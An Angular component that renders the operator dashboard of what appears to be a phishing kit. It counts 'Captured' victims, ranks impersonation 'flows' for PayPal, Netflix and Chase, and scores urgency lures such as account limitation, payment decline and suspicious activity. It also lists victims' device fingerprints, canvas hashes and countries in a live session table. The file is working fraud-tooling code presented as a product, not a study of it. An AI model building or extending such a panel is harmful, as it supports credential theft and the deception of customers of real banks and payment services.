
import { Component, inject, computed, signal, OnInit, Output, EventEmitter } from '@angular/core';
import { CommonModule } from '@angular/common';
import { StatsService } from '../../services/stats.service';
import { StateService } from '../../services/state.service';
import { SettingsService } from '../../services/settings.service';
import { BrandCardComponent } from '../ui/brand-card.component';
import { getFlowById, FlowConfig } from '../../services/flows.service';

@Component({
    selector: 'app-dashboard-view',
    standalone: true,
    imports: [CommonModule, BrandCardComponent],
    template: `
    <div class="dashboard-grid animate-fade-in space-y-8">
        <!-- Top Metrics (Summary) -->
        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6">
            <div class="bg-[#12121a] border border-[#2e2e3a] rounded-xl p-6 relative flex items-center gap-4">
                <div class="w-12 h-12 rounded-lg bg-indigo-500/10 flex items-center justify-center text-indigo-400 text-2xl">
                    👥
                </div>
                <div>
                    <div class="text-2xl font-bold text-white">{{ totalSessions() }}</div>
                    <div class="text-sm text-slate-400">Total Visits</div>
                </div>
                <div class="absolute top-4 right-4 text-xs font-bold px-2 py-1 rounded bg-green-500/10 text-green-400">
                    +12%
                </div>
            </div>
            
            <div class="bg-[#12121a] border border-[#2e2e3a] rounded-xl p-6 relative flex items-center gap-4">
                 <div class="w-12 h-12 rounded-lg bg-green-500/10 flex items-center justify-center text-green-400 text-2xl">
                    ✅
                </div>
                <div>
                    <div class="text-2xl font-bold text-white">{{ verifiedSessions() }}</div>
                    <div class="text-sm text-slate-400">Captured</div>
                </div>
            </div>

             <div class="bg-[#12121a] border border-[#2e2e3a] rounded-xl p-6 relative flex items-center gap-4">
                 <div class="w-12 h-12 rounded-lg bg-amber-500/10 flex items-center justify-center text-amber-400 text-2xl">
                    📱
                </div>
                <div>
                    <div class="text-2xl font-bold text-white">{{ mobilePercent() }}%</div>
                    <div class="text-sm text-slate-400">Mobile Traffic</div>
                </div>
            </div>

            <div class="bg-[#12121a] border border-[#2e2e3a] rounded-xl p-6 relative flex items-center gap-4">
                 <div class="w-12 h-12 rounded-lg bg-cyan-500/10 flex items-center justify-center text-cyan-400 text-2xl">
                    🌐
                </div>
                <div>
                    <div class="text-2xl font-bold text-white">{{ successRate() }}%</div>
                    <div class="text-sm text-slate-400">Conversion</div>
                </div>
            </div>
        </div>

        <!-- Data Capture Insights -->
        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
             <!-- Device Breakdown -->
             <div class="bg-[#12121a] border border-[#2e2e3a] rounded-xl p-6">
                 <h3 class="text-lg font-bold text-white mb-4 flex items-center gap-2">
                    <span class="material-icons text-sm text-slate-400">devices</span> Device Fingerprints
                 </h3>
                 <div class="space-y-4">
                     <!-- Platforms -->
                      @for (item of platformStats(); track item.name) {
                          <div class="w-full">
                              <div class="flex justify-between text-xs text-slate-400 mb-1">
                                  <span>{{ item.name }}</span>
                                  <span>{{ item.count }} ({{ item.percent }}%)</span>
                              </div>
                              <div class="w-full h-2 bg-[#2e2e3a] rounded-full overflow-hidden">
                                  <div class="h-full rounded-full transition-all duration-500"
                                       [style.width.%]="item.percent"
                                       [style.background]="item.color"></div>
                              </div>
                          </div>
                      }
                 </div>
             </div>

             <!-- Browser/Urgency Stats -->
             <div class="bg-[#12121a] border border-[#2e2e3a] rounded-xl p-6">
                 <h3 class="text-lg font-bold text-white mb-4 flex items-center gap-2">
                    <span class="material-icons text-sm text-slate-400">warning</span> Urgency Efficiency
                 </h3>
                 <div class="space-y-3">
                      <div class="p-3 bg-[#1a1a24] rounded-lg border border-[#2e2e3a] flex items-center justify-between">
                          <div class="flex items-center gap-3">
                              <div class="w-8 h-8 rounded bg-amber-500/10 flex items-center justify-center text-amber-500 text-lg">⚠️</div>
                              <div>
                                  <div class="text-sm font-bold text-white">Limitation</div>
                                  <div class="text-xs text-slate-500">PayPal Flows</div>
                              </div>
                          </div>
                          <div class="text-right">
                              <div class="text-sm font-bold text-white">{{ getUrgencyCount('limitation') }}</div>
                              <div class="text-xs text-green-400">High Conv.</div>
                          </div>
                      </div>

                      <div class="p-3 bg-[#1a1a24] rounded-lg border border-[#2e2e3a] flex items-center justify-between">
                          <div class="flex items-center gap-3">
                              <div class="w-8 h-8 rounded bg-red-500/10 flex items-center justify-center text-red-500 text-lg">💳</div>
                              <div>
                                  <div class="text-sm font-bold text-white">Declined</div>
                                  <div class="text-xs text-slate-500">Netflix Flows</div>
                              </div>
                          </div>
                          <div class="text-right">
                              <div class="text-sm font-bold text-white">{{ getUrgencyCount('payment_decline') }}</div>
                              <div class="text-xs text-slate-400">Avg</div>
                          </div>
                      </div>

                      <div class="p-3 bg-[#1a1a24] rounded-lg border border-[#2e2e3a] flex items-center justify-between">
                          <div class="flex items-center gap-3">
                              <div class="w-8 h-8 rounded bg-blue-500/10 flex items-center justify-center text-blue-500 text-lg">🏦</div>
                              <div>
                                  <div class="text-sm font-bold text-white">Suspicious</div>
                                  <div class="text-xs text-slate-500">Chase Flows</div>
                              </div>
                          </div>
                          <div class="text-right">
                              <div class="text-sm font-bold text-white">{{ getUrgencyCount('suspicious_activity') }}</div>
                          </div>
                      </div>
                 </div>
             </div>

              <!-- Top Flows -->
             <div class="bg-[#12121a] border border-[#2e2e3a] rounded-xl p-6 flex flex-col">
                 <h3 class="text-lg font-bold text-white mb-4">Top Active Flows</h3>
                 <div class="flex-grow space-y-4 overflow-y-auto max-h-[250px] pr-2 custom-scrollbar">
                     @for (flow of enabledFlows(); track flow.id) {
                         <div class="flex items-center justify-between p-2 hover:bg-[#1a1a24] rounded transition-colors cursor-pointer border border-transparent hover:border-[#2e2e3a]">
                             <div class="flex items-center gap-3">
                                 <span class="text-xl">{{ flow.icon }}</span>
                                 <div class="text-sm font-medium text-white">{{ flow.name }}</div>
                             </div>
                             <div class="text-xs font-mono text-slate-400 bg-[#000]/30 px-2 py-1 rounded">
                                 {{ getFlowSessions(flow.id) }} sessions
                             </div>
                         </div>
                     }
                 </div>
             </div>
        </div>

        <!-- Recent Activity Table -->
        <div class="section-header pt-4">
            <h2 class="text-xl font-bold text-white">Live Data Stream</h2>
            <button class="text-sm text-indigo-400 hover:text-indigo-300" (click)="navigate.emit('sessions')">
                View All Logs →
            </button>
        </div>
        <div class="bg-[#12121a] border border-[#2e2e3a] rounded-xl overflow-hidden">
            <table class="w-full text-left">
                <thead>
                    <tr class="text-xs text-slate-500 uppercase bg-[#1a1a24] border-b border-[#2e2e3a]">
                        <th class="px-6 py-4">Flow Target</th>
                        <th class="px-6 py-4">Session & Device</th>
                        <th class="px-6 py-4">Status</th>
                        <th class="px-6 py-4">Fingerprint ID</th>
                        <th class="px-6 py-4">Time</th>
                    </tr>
                </thead>
                <tbody class="divide-y divide-[#2e2e3a]">
                    @for (session of recentSessions(); track session.id) {
                        <tr class="hover:bg-[#1a1a24] transition-colors group">
                            <td class="px-6 py-4">
                                <div class="flex items-center gap-2" [style.color]="session.flowColor">
                                    <span class="text-lg">{{ session.flowIcon }}</span>
                                    <span class="font-bold text-white text-sm">{{ session.flowName }}</span>
                                </div>
                            </td>
                            <td class="px-6 py-4">
                                <div class="flex flex-col">
                                    <span class="text-sm text-slate-300 font-mono">{{ session.id.substring(0,8) }}</span>
                                    <span class="text-xs text-slate-500 flex items-center gap-1">
                                        <span class="material-icons text-[10px]">{{ session.deviceIcon }}</span>
                                        {{ session.platform }}
                                    </span>
                                </div>
                            </td>
                            <td class="px-6 py-4">
                                <span class="px-2 py-1 rounded text-xs border font-bold tracking-wide"
                                    [class.bg-green-500-10]="session.status === 'Verified'"
                                    [class.text-green-400]="session.status === 'Verified'"
                                    [class.border-green-500-20]="session.status === 'Verified'"
                                    [class.bg-yellow-500-10]="session.status === 'Pending'"
                                    [class.text-yellow-400]="session.status === 'Pending'"
                                    [class.border-yellow-500-20]="session.status === 'Pending'"
                                    [class.bg-red-500-10]="session.status === 'Rejected'"
                                    [class.text-red-400]="session.status === 'Rejected'">
                                    {{ session.status }}
                                </span>
                            </td>
                            <td class="px-6 py-4 text-xs font-mono text-indigo-400 opacity-80 group-hover:opacity-100">
                                {{ session.fingerprintShort }}
                            </td>
                            <td class="px-6 py-4 text-sm text-slate-500">{{ session.startedAgo }}</td>
                        </tr>
                    }
                </tbody>
            </table>
        </div>
    </div>
  `
})
export class DashboardViewComponent implements OnInit {
    @Output() navigate = new EventEmitter<string>();

    private statsService = inject(StatsService);
    private stateService = inject(StateService);
    private settings = inject(SettingsService);

    // Stats Signals
    totalSessions = computed(() => this.statsService.stats().totalSessions);
    verifiedSessions = computed(() => this.statsService.stats().verifiedSessions);
    totalLinks = computed(() => this.statsService.stats().totalLinks);
    successRate = computed(() => this.statsService.stats().successRate);

    // Calculated Metrics
    mobilePercent = computed(() => {
        const history = this.stateService.history();
        if (!history.length) return 0;
        const mobile = history.filter(s => {
            const ua = s.data?.fingerprint?.userAgent?.toLowerCase() || '';
            return ua.includes('mobile') || ua.includes('android') || ua.includes('iphone');
        }).length;
        return Math.round((mobile / history.length) * 100);
    });

    platformStats = computed(() => {
        const history = this.stateService.history();
        const stats = { iOS: 0, Windows: 0, Mac: 0, Android: 0, Linux: 0, Other: 0 };

        history.forEach(s => {
            const p = (s.data?.fingerprint?.platform || '').toLowerCase();
            const ua = (s.data?.fingerprint?.userAgent || '').toLowerCase();

            if (p.includes('iphone') || p.includes('ipad') || ua.includes('iphone')) stats.iOS++;
            else if (p.includes('win') || ua.includes('windows')) stats.Windows++;
            else if (p.includes('mac') || ua.includes('macintosh')) stats.Mac++;
            else if (p.includes('android') || ua.includes('android')) stats.Android++;
            else if (p.includes('linux')) stats.Linux++;
            else stats.Other++;
        });

        const total = history.length || 1;
        const result = [
            { name: 'iOS', count: stats.iOS, percent: Math.round((stats.iOS / total) * 100), color: '#3b82f6' },
            { name: 'Windows', count: stats.Windows, percent: Math.round((stats.Windows / total) * 100), color: '#0ea5e9' },
            { name: 'Android', count: stats.Android, percent: Math.round((stats.Android / total) * 100), color: '#10b981' },
            { name: 'macOS', count: stats.Mac, percent: Math.round((stats.Mac / total) * 100), color: '#a855f7' },
        ].filter(i => i.count > 0).sort((a, b) => b.count - a.count);

        return result.length ? result : [{ name: 'Collecting...', count: 0, percent: 0, color: '#666' }];
    });

    // Flows Logic
    enabledFlowIds = computed(() => this.settings.userSettings().enabledFlows || ['paypal']);

    enabledFlows = computed(() => {
        return this.enabledFlowIds()
            .map(id => getFlowById(id))
            .filter((f): f is FlowConfig => !!f);
    });

    ngOnInit() {
        // Data is fetched by parent layout or service init
    }

    // Helpers
    getFlowSessions(flowId: string): number {
        return this.stateService.history()
            .filter(s => s.data?.flowId === flowId || (flowId === 'paypal' && !s.data?.flowId))
            .length;
    }

    getUrgencyCount(type: string): number {
        // Estimate based on flow type active in session
        const history = this.stateService.history();
        return history.filter(s => {
            const flow = getFlowById(s.data?.flowId || 'paypal');
            return flow?.urgency?.type === type;
        }).length;
    }

    // Recent Sessions
    recentSessions = computed(() => {
        return this.stateService.history().slice(0, 10).map(s => {
            const flow = getFlowById(s.data?.flowId || 'paypal');
            const ua = (s.data?.fingerprint?.userAgent || '').toLowerCase();
            let deviceIcon = 'computer';
            let platform = 'Desktop';

            if (ua.includes('mobile')) { deviceIcon = 'smartphone'; platform = 'Mobile'; }
            if (ua.includes('ipad') || ua.includes('tablet')) { deviceIcon = 'tablet'; platform = 'Tablet'; }

            const fingerprintShort = s.data?.fingerprint?.canvasHash ?
                'FP-' + s.data.fingerprint.canvasHash.toString().substring(0, 8) :
                'Analyzing...';

            return {
                id: s.id,
                flowName: flow?.name || 'Unknown',
                flowIcon: flow?.icon || '❓',
                flowColor: flow?.color || '#666',
                status: s.status,
                location: s.data?.ipCountry || 'Unknown',
                startedAgo: this.timeAgo(new Date(s.timestamp)),
                deviceIcon,
                platform,
                fingerprintShort
            };
        });
    });

    private timeAgo(date: Date): string {
        const seconds = Math.floor((new Date().getTime() - date.getTime()) / 1000);
        if (seconds < 60) return 'Just now';
        const minutes = Math.floor(seconds / 60);
        if (minutes < 60) return `${minutes}m ago`;
        const hours = Math.floor(minutes / 60);
        if (hours < 24) return `${hours}h ago`;
        return `${Math.floor(hours / 24)}d ago`;
    }
}
